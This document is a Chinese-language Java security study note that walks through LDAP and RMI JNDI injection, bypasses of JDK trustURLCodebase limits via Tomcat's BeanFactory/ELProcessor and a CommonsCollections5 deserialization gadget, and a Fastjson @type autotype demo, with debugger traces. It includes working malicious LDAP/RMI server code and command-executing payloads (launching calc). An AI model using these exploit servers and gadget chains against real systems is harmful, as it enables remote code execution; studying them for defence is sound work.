- dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库）
- ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支）
- cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？）

举个例子一条记录就是 dn="uid=songtao.xu,ou=oa,dc=example,dc=com"

#### LDAP POC

其实利用方法是没差的，我们之前分析的时候也可以看到代码会根据传入协议头的区别去进入对应的处理函数，只需要修改传入参数的解析头,再启动ldap服务，恶意class的web服务即可。

我们重点关注版本问题，我们在1.8u171版本(RMI+JNDI不行、LDAP+JNDI可以的版本)下去使用ldap+jndi注入。

起一个 ldap server :

pom依赖

```
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>6.0.0</version>
</dependency>
```

LdapServer

```
package jndi;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#Exec";
        int port = 1389;


        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

也可以用工具起

```
java8 -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Exec 1389
package jndi;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
        String uri = "ldap://127.0.0.1:1389/poc";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(uri);
    }
}
```

![image-20220221140512103](img/image-20220221140512103.png)![image-20220221140512103](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221140512103.png?lastModify=1646033842)

#### 调试分析

下断点跟进 lookup

![image-20220221140728598](img/image-20220221140728598.png)![image-20220221140728598](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221140728598.png?lastModify=1646033842)

`getURLOrDefaultInitCtx(name)` 得到对应的 ldap context。

跟进`ldapURLContext#lookup`

![image-20220221140903777](img/image-20220221140903777.png)![image-20220221140903777](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221140903777.png?lastModify=1646033842)

跟进`super.lookup` ，也就是`GenericURLContext#lookup`

![image-20220221141008552](img/image-20220221141008552.png)![image-20220221141008552](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221141008552.png?lastModify=1646033842)

跟进`PartialCompositeContext#lookup`

![image-20220221141145627](img/image-20220221141145627.png)![image-20220221141145627](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221141145627.png?lastModify=1646033842)

跟进`var2.p_lookup`

![image-20220221141236016](img/image-20220221141236016.png)![image-20220221141236016](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221141236016.png?lastModify=1646033842)

继续跟`this.c_lookup`

![image-20220221141338907](img/image-20220221141338907.png)![image-20220221141338907](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221141338907.png?lastModify=1646033842)

LdapServer中有写入， if 成立，

跟进`Obj.decodeObject`

![image-20220221141549412](img/image-20220221141549412-16454241505684.png)![image-20220221141549412](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221141549412-16454241505684.png?lastModify=1646033842)

跟进了`decodeReference`

![image-20220221141932918](img/image-20220221141932918.png)![image-20220221141932918](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221141932918.png?lastModify=1646033842)

这里它自己实例化了一个`Reference`

最后  `return var5;`

回到 `c_lookup`

![image-20220221142106900](img/image-20220221142106900-16454244678175.png)![image-20220221142106900](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221142106900-16454244678175.png?lastModify=1646033842)

跟进 `DirectoryManager.getObjectInstance`

![image-20220221142210143](img/image-20220221142210143.png)![image-20220221142210143](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221142210143.png?lastModify=1646033842)

跟进 `getObjectFactoryFromReference`

![image-20220221142322951](img/image-20220221142322951.png)![image-20220221142322951](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221142322951.png?lastModify=1646033842)

跟之前的 RMI+JNDI 一样了，先本地加载，为 null 的化远程加载

![image-20220221142421109](img/image-20220221142421109.png)![image-20220221142421109](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221142421109.png?lastModify=1646033842)

![image-20220221142432377](img/image-20220221142432377.png)![image-20220221142432377](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221142432377.png?lastModify=1646033842)

最终调用 `factory.getObjectInstance` 重写方法执行命令。

这中途没有经过 RMI+JNDI 的那个 if 限制。

但是高版本依旧会遇到一些限制

默认这里的 trustURLCodebase 默认为 false，

![image-20220221132331520](img/image-20220221132331520.png)![image-20220221132331520](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221132331520.png?lastModify=1646033842)

> 不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制， 在Oracle JDK 11.0.1、8u191、7u201、6u211之后 **com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false**。



  https://xz.aliyun.com/t/6633

## 绕过JDK高版本进行JNDI注入

前面提到

> 不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制， 在Oracle JDK 11.0.1、8u191、7u201、6u211之后 **com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false**。

对版本也进行了限制，但是有绕过的方法。

- 通过反序列化
- 通过加载本地类

测试jdk 8u281

#### 通过本地加载类 | RMI+jndi

思路：加载一个目标机器 classpath 中存在的类，然后将其实例化，调用其最后的 `factory.getObjectInstance` 方法时实现代码执行。

```
if (f != null) {  
    factory = getObjectFactoryFromReference(ref, f);
    if (factory != null) {
        return factory.getObjectInstance(ref, name, nameCtx,environment);
    }
```

RMI+JNDI 第一个限制，需要 `var8.getFactoryCladdLocation` 是 null，也就是不能设置从远程加载了。绕过思路就是从本地找一个类，这样这个 if 就可以绕过了。

![image-20220221131056542](img/image-20220221131056542.png)![image-20220221131056542](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221131056542.png?lastModify=1646033842)

**找到 `org.apache.naming.factory.BeanFactory` 刚好满足条件，并且存在被利用的可能，存在于 Tomcat 依赖包中，使用也比较广泛。**





目标 bean 要求：

- 有一个无参构造方法
- 有 public 的 setter 方法且参数为一个 String 类型

`javax.el.ELProcessor` 符合条件：

- ELProcessor 中有个 eval(String) 方法可以执行 EL 表达式

poc:

```
package jndi.bypass;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JndiBypassServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
        ref.add(new StringRefAddr("forceString", "x=eval"));
        // 利用表达式执行命令
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("poc", referenceWrapper);

    }
}
```

![image-20220221162427106](img/image-20220221162427106.png)![image-20220221162427106](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221162427106.png?lastModify=1646033842)

#### 调试分析

前面的和之前的差不多，

这里来到 `RegistryContext#decodeObject`

![image-20220221164616321](img/image-20220221164616321.png)![image-20220221164616321](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221164616321.png?lastModify=1646033842)

拿到 poc 中的 `ResourceRef` 对象，然后进行 if 判断，因为这里 `var8 != null` 和 `!trustURLCodebase` 肯定是为 true 的，所以想要绕过 if 判断就需要 `var8.getFactoryClassLocation()` 为 null，poc 中

```
new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
```

最后一位参数为赋值`classFactoryLocation` 的，为 null ，所以不满足 if ，进入 else，绕过第一个

![image-20220221165021734](img/image-20220221165021734.png)![image-20220221165021734](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221165021734.png?lastModify=1646033842)

跟进 `NamingManager.getObjectInstance`

![image-20220221165759162](img/image-20220221165759162.png)![image-20220221165759162](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221165759162.png?lastModify=1646033842)

f 为 poc 传入的参数 `org.apache.naming.factory.BeanFactory`

跟进 `getObjectFactoryFromReference`

![image-20220221165908991](img/image-20220221165908991.png)![image-20220221165908991](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221165908991.png?lastModify=1646033842)

因为类在本地，所以会本地加载，跟进看看

![image-20220221170018569](img/image-20220221170018569.png)![image-20220221170018569](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221170018569.png?lastModify=1646033842)

继续跟

![image-20220221170037919](img/image-20220221170037919.png)![image-20220221170037919](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221170037919.png?lastModify=1646033842)

使用 Class.forName 获取类，

回到 getObjectFactoryFromReference

![image-20220221170131052](img/image-20220221170131052.png)![image-20220221170131052](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221170131052.png?lastModify=1646033842)

这里因为本地获取到了类，所以 if 跳过，跳过了第二个限制

![image-20220221170230339](img/image-20220221170230339.png)![image-20220221170230339](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221170230339.png?lastModify=1646033842)

最后实例化，获得的类 `org.apache.naming.factory.BeanFactory`。

回到 `getObjectInstance`，进入 if 判断，

![image-20220221170425628](img/image-20220221170425628.png)![image-20220221170425628](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221170425628.png?lastModify=1646033842)

进入到上边获得的类的`getObjectInstance` 方法，也就是`BeanFactory#getObjectInstance` (还记得之前是我们远程自己重写的该方法从而命令执行)

![image-20220221170650747](img/image-20220221170650747.png)![image-20220221170650747](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221170650747.png?lastModify=1646033842)

首先获得 poc 传入的 `javax.el.ELProcessor`，然后loadClass 加载，

![image-20220221171051488](img/image-20220221171051488.png)![image-20220221171051488](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221171051488.png?lastModify=1646033842)

这里拿到类的描述信息，包括属性、方法等，然后反射拿到无参构造函数进行实例化。（所以找到的类要有无参构造函数）

![image-20220221171249533](img/image-20220221171249533.png)![image-20220221171249533](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221171249533.png?lastModify=1646033842)

这里去键为 `forceString` 的值，在 poc中手动添加了 是 `x=eval`,

然后新建了一个 hashmap，

![image-20220221171740067](img/image-20220221171740067.png)![image-20220221171740067](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221171740067.png?lastModify=1646033842)

进入 if ，拿到 `x=eval` 字符串，然后将 = 前后分别赋值，

![image-20220221171850780](img/image-20220221171850780.png)![image-20220221171850780](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221171850780.png?lastModify=1646033842)

在前面新建的 hashmap 里放东西，键位 x ,值为反射获得的 ELProcessor 类的方法，方法是 eval，参数类型为 String.class。（所以需要有一个String类型参数的方法）.

![image-20220221172540364](img/image-20220221172540364.png)![image-20220221172540364](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221172540364.png?lastModify=1646033842)

获得`ref.add`里的所有值，然后进行循环遍历，直到

```
ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")"));
```

这个键为 x ，不满足 if 条件，进入接下来的代码，

获取内容，即为

```
"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()")
```

![image-20220221172830162](img/image-20220221172830162.png)![image-20220221172830162](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221172830162.png?lastModify=1646033842)

在之前的 haspmap 中取出存入的 eval 方法，然后反射调用，参数

bean 为 `Object bean = beanClass.getConstructor().newInstance();`

valueArray 为 

```
 Object[] valueArray = new Object[1];
// 存入上边获取的值
valueArray[0] = value;
```

执行 el 表达式

![image-20220221173141723](img/image-20220221173141723.png)![image-20220221173141723](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221173141723.png?lastModify=1646033842)

调用栈：

```
getValue:61, ELProcessor (javax.el)
eval:54, ELProcessor (javax.el)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
getObjectInstance:210, BeanFactory (org.apache.naming.factory)
getObjectInstance:321, NamingManager (javax.naming.spi)
decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:14, Client (jndi)
```

#### 通过本地反序列化链 | LDAP+JNDI

攻击者利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。

LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的  javaSerializedData 属性值不为空，则客户端的 obj.decodeObject()  方法就会对这个字段的内容进行反序列化。其中具体的处理代码如下：

```
if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) { 
    ClassLoader cl = helper.getURLClassLoader(codebases);
    return deserializeObject((byte[])attr.get(), cl);
}
```

假设目标系统中存在 CC依赖

```
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

poc:

```
package jndi.bypass;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class LdapBypassServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) throws Exception{
        String[] args=new String[]{"http://127.0.0.1:8000/#Exec"};
        int port = 1389;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaSerializedData",CommonsCollections5());

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    private static byte[] CommonsCollections5() throws Exception{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        Map map=new HashMap();
        Map lazyMap=LazyMap.decorate(map,chainedTransformer);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
        Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMapEntry);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);
        objectOutputStream.close();

        return byteArrayOutputStream.toByteArray();
    }

}
```

client:

```
package jndi;


import javax.naming.InitialContext;
import javax.naming.NamingException;


public class Client {
    public static void main(String[] args) throws NamingException {
        String uri = "ldap://127.0.0.1:1389/poc";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(uri);
    }
}
```

#### 调试分析

重复的就不分析了，

这里来到 `LdapCtx#c_lookup`

![image-20220221175424511](img/image-20220221175424511.png)![image-20220221175424511](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221175424511.png?lastModify=1646033842)

来到 if 判断，这里我们在 poc 中添加了这个变量的值，所以符合 进入 if，

![image-20220221175605507](img/image-20220221175605507.png)![image-20220221175605507](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221175605507.png?lastModify=1646033842)

跟进 `Obj#decodeObject`

![image-20220221175759369](img/image-20220221175759369.png)![image-20220221175759369](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221175759369.png?lastModify=1646033842)

我们也手动添加了 `javaSerializedData` 的值，进入 if，

跟进`deserializeObject`

![image-20220221180036910](img/image-20220221180036910.png)![image-20220221180036910](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221180036910.png?lastModify=1646033842)

进行反序列化传进来的数据，本地有依赖，命令执行。

调用栈

```
deserializeObject:532, Obj (com.sun.jndi.ldap)
decodeObject:239, Obj (com.sun.jndi.ldap)
c_lookup:1080, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:14, Client (jndi)
```



 https://xz.aliyun.com/t/8214

https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html	

https://paper.seebug.org/942/

https://xz.aliyun.com/t/7079

# Fastjson

fastjson是阿里巴巴的一个 json 库，可以将 java 对象和 json 格式字符串相互转换。

## 使用

导入依赖

```
<dependencies>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.24</version>
    </dependency>
</dependencies>
```

User.java

```
public class User {
    private int id;
    private int age;
    private String name;

    public User() {
    }

    public User(int id, int age, String name) {
        this.id = id;
        this.age = age;
        this.name = name;
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    @Override
    public String toString() {
        return "User{" +
                "id=" + id +
                ", age=" + age +
                ", name='" + name + '\'' +
                '}';
    }
}
```

Test.java

```
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class Test {
    public static void main(String[] args) {
        User user = new User(1,10,"yanmie");
        // 对象转字符串
        String s1 = JSON.toJSONString(user);
        String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(s1);
        System.out.println(s2);
        System.out.println();

        // 字符串转对象
        User user1 = (User) JSON.parse(s2);
        System.out.println("user1: " + user1);
        System.out.println(user1.getClass().getName());

        JSONObject user2 = JSON.parseObject(s2);
        System.out.println("user2: " + user2);
        System.out.println(user2.getClass().getName());

        Object user3 = JSON.parseObject(s2, Object.class);
        System.out.println("user3: " + user3);
        System.out.println(user3.getClass().getName());
    }
}
```

输出：

```
{"age":10,"id":1,"name":"yanmie"}
{"@type":"User","age":10,"id":1,"name":"yanmie"}

user1: User{id=1, age=10, name='yanmie'}
User
user2: {"name":"yanmie","id":1,"age":10}
com.alibaba.fastjson.JSONObject
user3: User{id=1, age=10, name='yanmie'}
User
```

fastjson 通过`JSON.toJSONString()` 将对象转为字符串(序列化)，当使用`SerializerFeature.WriteClassName` 参数时会将对象的类名`"@type":"类名"` 字段写入字符串。

在重新转回对象时会根据`@type`来指定类，进而调用该类的`set` 、`get` 方法。由于这个特性，可以指定`@type`为任意存在问题的类，造成一些问题。

在字符串转回对象的过程中(反序列化)，主要使用`JSON.parse()` 和`JSON.parseObject()` 两个方法。区别是：`parse` 方法会返回实际类型(User) 的对象，而`parseObject`方法在不指定 参数二时，返回`JSONObject` ，指定参数二才会返回实际类型(User)的对象，这里`Object.class` 也可换成具体的对象类型 `User.class`。

## 测试demo

fastjson AutoType 功能：

允许用户在反序列化数据中通过 `@type` 指定反序列化的 Class 类型。

特性：反序列化过程中会自动触发 get, set 方法。

测试：

Evil.java

```
package demo;

import java.io.IOException;

public class Evil {
    private String cmd;

    public Evil(){
        System.out.println("Evil#Evil()");
    }
    public Evil(String cmd){
        this.cmd = cmd;
    }

    public String getCmd() {
        System.out.println("Evil#getCmd --> notepad");
        try {
            Runtime.getRuntime().exec("notepad");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return cmd;
    }

    public void setCmd(String cmd) {
        System.out.println("Evil#setCmd --> calc");
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
        this.cmd = cmd;
    }
}
```

ParseTest.java

```
package demo;

import com.alibaba.fastjson.JSON;

import java.util.Scanner;

public class ParseTest {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        String json = scanner.nextLine();
        JSON.parse(json);
        System.out.println("---------------");
        JSON.parseObject(json);
        System.out.println("---------------");
        JSON.parseObject(json,Object.class);
        System.out.println("---------------");
        System.out.println("ok");
    }
}
```

输入

```
{"@type":"demo.Evil","cmd":"yanmie"}
```



![image-20220125185336442](img/image-20220125185336442.png)![image-20220125185336442](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125185336442.png?lastModify=1646033842)

- **parse :   调用 construct + set**
- **parseObject  调用  construct + set + get**
- **parseObject + 参数 Object.class :  调用  construct + set**

（parseObject 方法其实也是调用 parse 方法）

通过控制`@type`来实现反序列化Evil类，自动调用construct/se/get方法导致 rce。

## 为什么自动调用方法

为什么会自动调用这些方法呢?

在`JSON.parseObject(json);` 打断点进行分析

输入`{"@type":"demo.Evil","cmd":"yanmie"}`

![image-20220222115006145](img/image-20220222115006145.png)![image-20220222115006145](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222115006145.png?lastModify=1646033842)

参数为输入的字符串，

跟进 `parseObject`

![image-20220222115043327](img/image-20220222115043327.png)![image-20220222115043327](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222115043327.png?lastModify=1646033842)

可以看着这里实质上也调用了 `parse` 方法，

跟进

![image-20220222115216741](img/image-20220222115216741.png)![image-20220222115216741](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222115216741.png?lastModify=1646033842)

继续跟进

![image-20220222115306397](img/image-20220222115306397.png)![image-20220222115306397](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222115306397.png?lastModify=1646033842)

新建一个 JSON 解析器，跟进看看

![image-20220222115456790](img/image-20220222115456790.png)![image-20220222115456790](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222115456790.png?lastModify=1646033842)

`new JSONScanner(input, features)` 得到 json 字符串的一些信息

![image-20220222120034893](img/image-20220222120034893.png)![image-20220222120034893](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222120034893.png?lastModify=1646033842)

跟进 `this`

![image-20220222120331519](img/image-20220222120331519.png)![image-20220222120331519](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222120331519.png?lastModify=1646033842)

这里拿到字符串第一个字符 `{` ，进入 if，跟进 `lexer.next` (lexer意为词法分析器)

![image-20220222120441327](img/image-20220222120441327.png)![image-20220222120441327](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222120441327.png?lastModify=1646033842)

判断下一个位置不大于总长度，找到位置为 1 的字符，为 `"`，赋值给 this.ch ，然后赋值 token  `((JSONLexerBase)lexer).token = 12;`

回到 `JSON#parse`，跟进 `parser.parse()`

![image-20220222120822666](img/image-20220222120822666.png)![image-20220222120822666](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222120822666.png?lastModify=1646033842)

这里 token 为 12，跳入 12.

![image-20220222121009523](img/image-20220222121009523.png)![image-20220222121009523](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222121009523.png?lastModify=1646033842)

